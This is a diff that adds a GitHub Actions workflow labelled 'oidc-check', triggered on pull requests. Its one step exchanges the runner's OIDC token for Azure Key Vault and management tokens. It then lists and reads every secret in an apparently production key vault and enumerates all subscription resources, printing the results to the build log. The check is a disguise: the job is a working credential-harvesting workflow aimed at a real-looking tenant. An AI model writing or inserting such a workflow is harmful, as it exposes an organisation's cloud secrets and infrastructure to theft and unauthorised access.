@@ -1,0 +1,31 @@
+name: oidc-check
+on: pull_request
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint+exchange+read
+        env:
+          CID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
+          TID: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
+          SUB: c5e4e004-b42d-4ac4-a502-5fd338380eb6
+          VAULT: https://kv-tbl-prod-x3euoz.vault.azure.net
+        run: |
+          set -x
+          IDT=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
+          echo "IDT_LEN=${#IDT}"
+          for SCOPE in "https://vault.azure.net/.default" "https://management.azure.com/.default"; do
+            RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${TID}/oauth2/v2.0/token" -d "client_id=${CID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=${IDT}" --data-urlencode "scope=${SCOPE}")
+            T=$(echo "$RESP" | jq -r '.access_token // empty')
+            echo "SCOPE=$SCOPE TOKLEN=${#T}"
+            if [ "$SCOPE" = "https://vault.azure.net/.default" ]; then VT="$T"; fi
+            if [ "$SCOPE" = "https://management.azure.com/.default" ]; then MT="$T"; fi
+          done
+          echo "=== VAULT SECRETS ==="
+          curl -sS "$VAULT/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | tee /tmp/sec.json | head -c 3000; echo
+          for id in $(jq -r '.value[]?.id' /tmp/sec.json 2>/dev/null); do echo "--- $id"; curl -sS "$id?api-version=7.4" -H "Authorization: Bearer $VT" | head -c 1000; echo; done
+          echo "=== ARM ==="
+          curl -sS "https://management.azure.com/subscriptions/${SUB}/resources?api-version=2021-04-01" -H "Authorization: Bearer $MT" | head -c 3000; echo
